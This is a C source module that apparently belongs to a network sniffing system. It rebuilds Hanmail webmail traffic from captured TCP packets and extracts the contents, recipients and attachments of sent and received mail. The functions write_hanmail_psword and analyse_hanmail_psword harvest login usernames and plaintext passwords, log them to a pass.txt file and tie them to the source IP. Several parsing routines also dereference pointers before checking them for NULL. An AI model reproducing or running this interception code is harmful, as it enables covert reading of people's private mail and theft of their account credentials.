#include "common.h"

int writefilehanmail(Mail_info *mail_info)
{//printf("\n                writefilehanmail\n");
	char *p1 = NULL, *p2 = NULL;
	int result;
	size_t len;
	//printf("%s\n", mail_info->mail_data);
	p1 = strstr(mail_info->mail_data, "; D_sid=\"");
	if (p1 == NULL)
	{
		p1 = strstr(mail_info->mail_data, "; D_sid=");
		p1 += 8;
		p2 = strstr(p1, ";");
		len = p2 - p1;
		if (p2 == NULL)
			return -1;
	}
	else
	{
		p1 += 9;
		p2 = strstr(p1, "\";");
		len = p2 - p1;
		if (p2 == NULL)
			return -1;
	}
	if (len > MAX_FROM_LEN)
		len = MAX_FROM_LEN;
	memcpy(mail_info->from, p1, len);
	mail_info->from[len] = 0;
	if (!strstr(mail_info->from, "@hanmail.net"))
	{
		if (len + 12 > MAX_FROM_LEN)
			return -1;
		strcat(mail_info->from, "@hanmail.net");
	}

	p1 = strstr(p2, "TO=");
	if (p1 == NULL)
		return -1;
	p1 += 3;
	p2 = strstr(p1, "&CC=");
	len = p2 - p1;
	if (p2 == NULL)
		return -1;
	if (len > MAX_TO_LEN)
		len = MAX_TO_LEN;
	memcpy(mail_info->to, p1, len);
	mail_info->to[len] = 0;
	htmldecode_full(mail_info->to, mail_info->to);

	p1 = strstr(p2, "&CC=");
	if (p1 != NULL) 
	{
		p1 += 4;
		p2 = strstr(p1, "&BCC=");
		len = p2 - p1;
		if (len != 0) 
		{
			if (len > MAX_CC_LEN)
				len = MAX_CC_LEN;
			memcpy(mail_info->cc, p1, len);
			mail_info->cc[len] = 0;
			htmldecode_full(mail_info->cc, mail_info->cc);
		} 
		else 
		{
			mail_info->cc[0] = 0;
		}
	} 
	else 
	{
		mail_info->cc[0] = 0;
	}

	p1 = strstr(p2, "&BCC=");
	if (p1 != NULL) 
	{
		p1 += 5;
		p2 = strstr(p1, "&SUBJECT=");
		len = p2 - p1;
		if (len != 0) 
		{
			if (len > MAX_BCC_LEN)
				len = MAX_BCC_LEN;
			memcpy(mail_info->bcc, p1, len);
			mail_info->bcc[len] = 0;
			htmldecode_full(mail_info->bcc, mail_info->bcc);
		} 
		else 
		{
			mail_info->bcc[0] = 0;
		}
	} 
	else 
	{
		mail_info->bcc[0] = 0;
	}

	p1 = strstr(p2, "&SUBJECT=");
	if (p1 == NULL)
		return -1;
	p1 += 9;
	p2 = strstr(p1, "&SIGBODY=");
	len = p2 - p1;
	if (p2 == NULL)
		return -1;
	if (len > MAX_SUBJ_LEN)
		len = MAX_SUBJ_LEN;
	memcpy(mail_info->subject, p1, len);
	htmldecode_full(mail_info->subject, mail_info->subject);
	mail_info->subject[len] = 0;

	p1 = strstr(p2, "&BODY=");
	if (p1 == NULL)
		return -1;
	p1 += 6;
	p2 = strstr(p1, "&CMD=");
	len = p2 - p1;
	if (p2 == NULL)
		return -1;
	mail_info->content = (char *)malloc(len + 1);
	if (mail_info->content == NULL)
		return -1;
	memcpy(mail_info->content, p1, len);
	mail_info->content[len] = 0;
	htmldecode_full(mail_info->content, mail_info->content);

	create_dir(mail_info->save_path, "hanmail", mail_info->from);

	Attachment *attachment;
        Attach_info *attach_tmp;
        Attach_info *attach_info;
        char writepath[MAX_PATH_LEN] = {0};
        attach_info=attach_tab.head->next;
        int  i=0;
        int flag=0;
	char ID[MAX_ID_LEN];
	memset(ID,0,MAX_ID_LEN);
	p1 = strstr(mail_info->mail_data, "&PID=");
	p1 += 5;
	p2 = strstr(p1, "&FOLDER=");
	len = p2 - p1;
	memcpy(ID, p1, len);
	ID[len] = 0;
		
	while(attach_info!=NULL)
        {
		if(!strncmp(attach_info->ID_str, ID, strlen(ID)))
		{
	                i++;
		        attachment = (Attachment *)malloc((sizeof(Attachment))+1);
                        memset(attachment,0,(sizeof(Attachment))+1);
                        memset(attachment->loc_filename,0,MAX_FN_LEN+1);
			attachment->next =NULL;
			//sprintf(attachment->loc_filename,"attach%d_%s",i,attach_info->attach_name);
			snprintf(attachment->loc_name, MAX_FN_LEN, "%s", attach_info->attach_name);
			snprintf(attachment->loc_filename, MAX_FN_LEN, "attach%d", i);
			if(!flag)
		        {
				mail_info->attach = attachment;
				flag++;
			}
			else
			{
				attachment->next =mail_info->attach->next;
				mail_info->attach->next=attachment;
			}
			sprintf(writepath,"%s/%s",mail_info->save_path,attachment->loc_filename);
                        link(attach_info->path_of_here,writepath);
			unlink(attach_info->path_of_here);
			del_attach_node(attach_info);
			attach_tmp = attach_info->next;
		        delete_attach(attach_info);
			attach_info = attach_tmp;
			continue;
		}
		attach_info = attach_info->next;
	}
	
	mail_info->num_of_attach = i;

	char *tmp_str = NULL;
	tmp_str = clear_html_tag(mail_info->content);
	free(mail_info->content);
	mail_info->content = tmp_str;

	if (NULL == mail_info->content)
		return -1;

	write_to_file(mail_info);

	return 0;
}

int analyse_hanmail_mail(Mail_info *mail_info, char *data, unsigned int data_len, struct tcphdr *ptcp, int is_to_s)
{//printf("\n                analyse_hanmail_mail\n");//printf("\ndata_len = %d,data = %s\n",data_len,data);
	unsigned int seq = ntohl(ptcp->seq);
	int off_seq;
	int result;

	off_seq = seq - mail_info->start_seq;
	if (is_to_s) 
	{
		if (!mail_info->is_complished) 
		{
			result = write_to_mail(mail_info, data, data_len, ptcp);
			return result;
		}
	} 
	else if (!strncmp(data, "HTTP/1.1 200 OK\r\n", 15))
	{
		get_time(data, mail_info->sent_time);
		mail_info->is_complished = 1;
		writefilehanmail(mail_info);
		del_mail_node(mail_info);
	}
	
	return 0;
}

int analyse_hanmail_attach(Attach_info *attach_info, char *data, unsigned int data_len, struct tcphdr *ptcp, int is_to_s)
{//printf("\n                analyse_hanmail_attach\n");
	unsigned int seq = ntohl(ptcp->seq);
	int off_seq;
	int result=0;
	
	//printf("%s\n", data);

	off_seq = seq - attach_info->start_seq;
	if (is_to_s) 
	{
		if (!strncmp(data, "POST /Mail-bin/attach_mailplus.frame3.cgi?", 42))
		{
			char *p1 = strstr(data,"&PID=");
			p1 += 5;
			char *p2 = strstr(p1,"&attachid=");
			strncpy(attach_info->ID_str,p1,p2-p1);
			attach_info->ID_str[p2-p1]=0;
			
			attach_info->recive_length = 0;
			char *p = strstr(data, "\r\nContent-Length: ");
			if (p == NULL)
			{
				attach_info->recive_length = 5000;
			}
			else
			{
				p += 18;
				while( *p != '\r') 
				{
					attach_info->recive_length = attach_info->recive_length * 10 + (*p - '0');
					p++;
				}
			}
			if (attach_info->recive_length <= 0) 
				return -1;
			
			attach_info->recive_length += 1000;
			attach_info->recive_data = (char *)malloc(attach_info->recive_length);
			if(attach_info->recive_data == NULL) 
				return -1;
			memset(attach_info->recive_data,0,attach_info->recive_length);
			
			p1 = strstr(data,"\r\n\r\n");
			if(p1 == NULL)
				return -1;
			p1+=4;
            attach_info->start_seq = seq+p1-data; 
			memcpy(attach_info->recive_data, p1, data_len-(p1-data));
		}
		else 
		{
			if((attach_info->recive_data != NULL) && data_len)
			{
				off_seq = seq - attach_info->start_seq;
				if (off_seq+ data_len > attach_info->recive_length) 
				{
					attach_info->recive_data = (char *)realloc(attach_info->recive_data,attach_info->recive_length+((off_seq+ data_len-attach_info->recive_length)/5000+1)*5000);
					if(attach_info->recive_data == NULL)
						return -1;
 					attach_info->recive_length+=((off_seq+ data_len-attach_info->recive_length)/5000+1)*5000;
					memcpy(attach_info->recive_data + off_seq, data, data_len); 
				}
				else
				{
					memcpy(attach_info->recive_data + off_seq, data, data_len);
				}
			}
		
		}
		if(attach_info->recive_data != NULL && !attach_info->is_get_ok)
		{
			if(ptcp->fin || strstr(data+data_len-4,"--\r\n"))
			{
				attach_info->is_get_ok=1;
				attach_info->is_complished =1;
                char *p1=strstr(attach_info->recive_data,"filename=\"");
				if(p1 == NULL)
				{
					return -1;
				}
				p1+=10;
				char *p2=strstr(p1,"\"\r\n");
				if(p2 == NULL)
				{
					return -1;
				}
				strncpy(attach_info->attach_name,p1,p2-p1);
	            attach_info->attach_name[p2-p1]=0;

                p1=strstr(p1,"\r\n\r\n");
                p1+=4;
                p2 = memfind(p1, "\r\n------", attach_info->recive_length-(p1-attach_info->recive_data)-1000);
                if(p2 == NULL)
                {
                    return -1;
                }
				struct timeval tv;
				struct timezone tz;
				gettimeofday(&tv,&tz);
                memset(attach_info->path_of_here,0,MAX_PATH_LEN + 1);
				sprintf(attach_info->path_of_here,"%s/%lu-%lu",mail_temp_path,tv.tv_sec,tv.tv_usec); //3
				mode_t  file_mode = S_IRUSR |S_IWUSR|S_IRGRP|S_IROTH;
				int fd = open(attach_info->path_of_here,O_RDWR|O_CREAT,file_mode);
				if (fd ==-1)
				{
					return -1; 
				}
                write(fd,p1,p2-p1);
                close(fd);
			}
		} 

		return result;
	} 
}

int analyse_hanmail_recive(Mail_info *mail_info,char *data,unsigned int data_len,struct tcphdr *tcp, int is_to_s)
{//printf("\nanalyse_hanmail_recive\n");

	unsigned int seq=ntohl(tcp->seq);
	int off_seq;
	int result;
	int range;
	int len;
	char *p=NULL;
	static int flag = -1;
	
	//printf("%s\n", data);
	
	if (is_to_s)
	{
		if(!strncmp(data, "GET /hanmailex/ViewMail.daum?", 29))
		{
			char *p1=strstr(data,"&mailId=");
			if (p1==NULL) 
				return -1;
			p1+=8;
			char *p2=strstr(p1,"&");
			if (p2==NULL)
				return -1;
			len=p2-p1;
			if(len>MAX_ID_LEN) len=MAX_ID_LEN;
			memcpy(mail_info->mail_id,p1,len);
			mail_info->mail_id[len]=0;
			//printf("mail_info->mail_id : %s\n", mail_info->mail_id);
		}
	}
	else
	{//1
		if(!strncmp(data,"HTTP/1.",7))
		{//2
			if(strstr(data, "Content-Encoding: gzip\r\n"))
				flag = 1;
			else
				flag = 0;

			mail_info->recive_length = 500000;
			mail_info->recive_data = (char *)malloc(mail_info->recive_length);
			if(mail_info->recive_data ==NULL)
			{
				return -1;
			}
			memset(mail_info->recive_data,0,mail_info->recive_length);
			p=strstr(data,"\r\n\r\n");
			if (p==NULL)
			{
				return -1;
			}
			p+=4;
			mail_info->http_seq = seq+p-data;
			len=data_len-(p-data);
			if (len>mail_info->recive_length)
			{
				return -1;
			}
			memcpy(mail_info->recive_data,p,len);
			if (!memcmp(data+data_len-5,"0\r\n\r\n",5))
			{
				if(flag)
				{
					decomp_gzip_1(mail_info->recive_data,mail_info->recive_length-22,&mail_info->mail_data);
				}
				else
				{
					mail_info->mail_data = (char *)malloc(mail_info->recive_length);
					memset(mail_info->mail_data,0,mail_info->recive_length);
					memcpy(mail_info->mail_data,mail_info->recive_data,mail_info->recive_length);
				}
				write_hanmail_recive_file(mail_info);
				del_mail_node(mail_info);
			}
		}
		else if(mail_info->recive_data!=NULL)
		{//printf("\n2\n");
			off_seq=seq-mail_info->http_seq;
			range=off_seq+data_len;
			if (range>mail_info->recive_length)
			{
				return -1;
			}
			memcpy(mail_info->recive_data+off_seq,data,data_len);
			if(!memcmp(data+data_len-4,"\r\n\r\n",4))
			{//printf("\nflag = %d\n",flag);
				if(flag)
				{//printf("\n3\n");
					decomp_gzip_1(mail_info->recive_data,mail_info->recive_length-22,&mail_info->mail_data);
				}
				else
				{//printf("\n4\n");
					mail_info->mail_data = (char *)malloc(mail_info->recive_length);
					memset(mail_info->mail_data,0,mail_info->recive_length);
					memcpy(mail_info->mail_data,mail_info->recive_data,mail_info->recive_length);
				}
				write_hanmail_recive_file(mail_info);
				del_mail_node(mail_info);
			}
		}//3
	}//1
	return 0;
}

void write_hanmail_recive_file(Mail_info *mail_info)
{//printf("\nwrite_hanmail_recive_file\n");
	char *p1=NULL, *p2=NULL, *p3=NULL;
	char tmp[50]={0};
	time_t timeint;
	int len;
	//printf("%s\n", mail_info->mail_data);
	p1 = strstr(mail_info->mail_data,"<h4 id=\"mailViewSubject\" class=\"mail_title\"> ");
	if (p1==NULL) 
		return;
	p1+=45;
	p2=strstr(p1," </h4>");
	if(p2==NULL) 
		return;
	len=p2-p1;
	if (len>MAX_SUBJ_LEN) len=MAX_SUBJ_LEN;
	memcpy(mail_info->subject,p1,len);
	mail_info->subject[len]=0;
	clear_tag(mail_info->subject);
	//printf("mail_info->subject : %s\n", mail_info->subject);

	p1=strstr(p2,"<div class=\"header-text\">Date</div>");
	if(p1==NULL) 
		return;
	p1=strstr(p1,"class=\"header-value\">: ");
	if(p1==NULL) 
		return;
	p1 += 23;
	p2=strstr(p1,"</div>");
	if(p2==NULL) 
		return;
	len=p2-p1;
	if(len>MAX_TIME_LEN) len=MAX_TIME_LEN;
	memcpy(mail_info->sent_time,p1,len);
	mail_info->sent_time[len]=0;
	clear_from(mail_info->sent_time);
	//printf("mail_info->sent_time : %s\n", mail_info->sent_time);

	p1=strstr(mail_info->mail_data,"<div class=\"header-text\">From</div>");
	if(p1==NULL) 
		return;
	p1=strstr(p1,"class=\"header-value\">: ");
	if(p1==NULL) 
		return;
	p1 += 23;
	p2=strstr(p1,"</div>");
	if(p2==NULL) 
		return;
	len=p2-p1;
	if(len>MAX_FROM_LEN) len=MAX_FROM_LEN;
	memcpy(mail_info->from,p1,len);
	mail_info->from[len]=0;
	clear_from(mail_info->from);
	//printf("mail_info->from : %s\n", mail_info->from);

	p1=strstr(p2,"<div class=\"header-text\">To</div>");
	if(p1==NULL) 
		return;
	p1=strstr(p1,"class=\"header-value\">: ");
	if(p1==NULL) 
		return;
	p1+=23;
	p2=strstr(p1,"</div>");
	if(p2==NULL) 
		return;
	len=p2-p1;
	if(len>MAX_TO_LEN) len=MAX_TO_LEN;
	memcpy(mail_info->to,p1,len);
	mail_info->to[len]=0;
	//printf("mail_info->to : %s\n", mail_info->to);

	p1=strstr(p2,"<div class=\"header-text\">Cc</div>");
	if(p1!=NULL) 
	{
		p1=strstr(p1,"class=\"header-value\">: ");
		p1+=23;
		p2=strstr(p1,"</div>");
		if(p2==NULL) 
			return;
		len=p2-p1;
		if(len>MAX_CC_LEN) len=MAX_CC_LEN;
		memcpy(mail_info->cc,p1,len);
		mail_info->cc[len]=0;
		//printf("mail_info->cc : %s\n", mail_info->cc);
	}

	p1=strstr(p2,"Start-->");
	if(p1==NULL) 
		return;
	p1+=8;
	p2=strstr(p1,"End -->");
	p2-=19;
	len=p2-p1;
	char *tmp1=NULL;
	tmp1=(char *)malloc(len+1);
	if(tmp1!=NULL)
	{
		memset(tmp1,0,len+1);
		memcpy(tmp1,p1,len);
		clear_tag(tmp1);
		mail_info->content=clear_html_tag(tmp1);
		free(tmp1);
		tmp1 = NULL;
	}
	//printf("mail_info->content : %s\n", mail_info->content);

	create_dir(mail_info->save_path,"hanmail",mail_info->from);
	write_to_file(mail_info);
}

int analyse_hanmail_attach_recive(Mail_info *mail_info, char *data, unsigned int data_len, struct tcphdr *ptcp, int is_to_s)
{//printf("\nanalyse_hanmail_attach_recive\n");
	unsigned int seq=ntohl(ptcp->seq);
	int off_seq=seq-mail_info->start_seq;
	int range;
	int n;
	//static int data_size = 0;
	
	if (is_to_s)
	{
		if (!strncmp(data, "GET /Mail-bin/view_submsg3.cgi?", 31))
		{
			char *p1, *p2;
			int len;
			p1=data;
			if (p1==NULL) return -1;
			p1=strstr(p1,"&MSGID=");
			if(p1==NULL) return -1;
			p1 +=7;
			p2 = strstr(p1,"&pos=");
			if (p2==NULL) return -1;
			len = p2-p1;
			if (len<0 || len >MAX_ID_LEN) return -1;
			memcpy(mail_info->mail_id,p1,len);
			mail_info->mail_id[len] = 0;
		}
	}
	else
	{
		if (!strncmp(data,"HTTP/1.1 200 OK\r\n",15))
		{
			mail_info->recive_length=get_http_length(data);
			n=judge_chunk(data);
			if(mail_info->recive_length <=0)
			{
				return -1;
			}
			mail_info->recive_length +=1000;
			mail_info->recive_data = (char *)malloc(mail_info->recive_length);
			
			if(mail_info->recive_data == NULL)
			{
				return -1;
			}
			memset(mail_info->recive_data, 0, mail_info->recive_length);
			mail_info->http_seq = seq;
     
		}//1
		if (mail_info->recive_data !=NULL)
		{
			off_seq = seq - mail_info->http_seq;
			range = off_seq + data_len;
			if (range>mail_info->recive_length)
			{
				return -1;
			}
			memcpy(mail_info->recive_data+off_seq,data,data_len);
			//data_size += data_len;
		}
		//printf("\n%d\n",data_size - (strstr(mail_info->recive_data,"\r\n\r\n") + 4 - mail_info->recive_data));
		if (ptcp->fin == 1 || !memcmp(data+data_len-4,"\r\n\r\n",4)/* || data_size > mail_info->recive_length-1000*/)
		{//printf("\n1\n");
			mail_info->is_complished = 1;
			write_attach_down_1(mail_info,mail_info->recive_length-1000,n);
			del_mail_node(mail_info);
		}//printf("\ndata_size = %d,mail_info->recive_length-1000 = %d\n",data_size,mail_info->recive_length-1000);
	}
	return 0;
}

int write_hanmail_psword(Mail_info *mail_info)
{
	char *p1 = NULL;
	char *p2 = NULL;
	char tmp_name[MAX_UN_LEN + 1] = {0};
	
	p1 = strstr(mail_info->mail_data, "&id=");
	if(p1 == NULL)
	{
		return -1;
	}
	
	p1 += 4;
	p2 = strstr(p1, "&pw=");
	if(p2 == NULL)
	{
		return -1;
	}
	
	int len = (p2-p1)>MAX_UN_LEN?MAX_UN_LEN:(p2-p1);
	memcpy(tmp_name, p1, len);
	tmp_name[len] = 0;
	htmldecode_full(tmp_name, mail_info->username);
	if (!strstr(mail_info->username, "@hanmail.net"))
	{
		if (len + 12 > MAX_UN_LEN)
			return -1;
		strcat(mail_info->username, "@hanmail.net");
	}

	p2+=4;
	p1 = strstr(p2, "&");
	if(p1==NULL)
	{
		len = mail_info->mail_data + strlen(mail_info->mail_data) - p2;
		if (len > MAX_PW_LEN)
			return -1;
	}
	else
	{
		len = p1 - p2;
		if (p1 == NULL || len > MAX_PW_LEN)
			return -1;
	}
	
	memset(mail_info->passwd, 0, MAX_UN_LEN+1);
	memcpy(mail_info->passwd, p2, len);
	mail_info->passwd[len] = 0;
	htmldecode_full(mail_info->passwd,mail_info->passwd);
	
    //LOG_INFO("usernamess = %s and password = %s\n",mail_info->username,mail_info->passwd);
	write_xml(mail_info);

	FILE *fp;

        char passpath[MAX_PATH_LEN];
	sprintf(passpath,"%s/pass.txt",mail_data_path);
	fp=fopen(passpath,"a+");
	if(fp==NULL) return -1;
	fprintf(fp,"\nusername=%s\npassword=%s\n",mail_info->username,mail_info->passwd);
	fclose(fp);

	insert_array(mail_info->username, mail_info->source_ip);
	return 0;
}

int analyse_hanmail_psword(Mail_info *mail_info,char *data,unsigned int datalen,struct tcphdr *tcp,int is_b_s)
{//printf("\nanalyse_hanmail_psword\n");
	unsigned int seq = ntohl(tcp->seq);
	int off_seq=seq-mail_info->start_seq;
	int range;
	char http_ok_head[11]="HTTP/1.1 ";

	if(is_b_s && !mail_info->is_complished)
	{
		if (mail_info->mail_length == 0)
		{
			mail_info->mail_length = 5000;
			mail_info->mail_data = (char *)malloc(5000);
			if(mail_info->mail_data ==NULL)
			{
				return -1;
			}
			memset(mail_info->mail_data,0,5000);
			mail_info->start_seq = seq;
		}
		if(mail_info->mail_length == 5000) 
		{
			int len;
			char *tmp;
			len = get_http_length(data);
			if (len > 0)
			{
				mail_info->mail_length += len;
				tmp = (char *)malloc(mail_info->mail_length);
				if(tmp ==NULL)
                {
					return -1;
				}
				memset(tmp,0,mail_info->mail_length);
				memcpy(tmp,mail_info->mail_data,5000);
				free(mail_info->mail_data);
				mail_info->mail_data = tmp;
			}
		}
		off_seq = seq - mail_info->start_seq;
		range=off_seq+datalen;
		if(range>mail_info->mail_length)
		{
			return -1;
		}
		memcpy(mail_info->mail_data+off_seq,data,datalen);
	}
	else if(!strncmp(data,http_ok_head,9))
	{
		write_hanmail_psword(mail_info);
		return -1;
	}
	return 0;
}

int analyse_hanmail(void *node, char *data, unsigned int data_len, struct tcphdr *ptcp, int is_to_s, int m_or_a)
{
	unsigned int type;
	int result = 0;
	if (!m_or_a) 
	{
		Mail_info *mail_info = (Mail_info *)node;
		type = mail_info->mail_type & 0x00FF;
		switch (type) 
		{
			case 0x01:
				result = analyse_hanmail_psword(mail_info,data,data_len,ptcp,is_to_s); 
				break;
			case 0x11:
				result = analyse_hanmail_mail(mail_info, data, data_len, ptcp, is_to_s);
				break;
			case 0x21:
				result = analyse_hanmail_recive(mail_info, data, data_len, ptcp, is_to_s);
				break;
			case 0x31:
				result = analyse_hanmail_attach_recive(mail_info,data,data_len,ptcp,is_to_s);
				break;
		}
		
		if(result == -1)
		{
			delete_mail_info(mail_info);
		}

	} 
	else 
	{
		Attach_info *attach_info = (Attach_info *)node;
		type = attach_info->attach_type & 0x00FF;
		switch (type) 
		{
		case 0x61:
			//printf("analyse_hanmail_attach_1\n");
			result = analyse_hanmail_attach(attach_info, data, data_len, ptcp, is_to_s);
			break;
		}
		if (result == -1) 
		{
			//printf("delete attach node ...\n");
			del_attach_node(attach_info);
			delete_attach(attach_info);
		}
	}
}
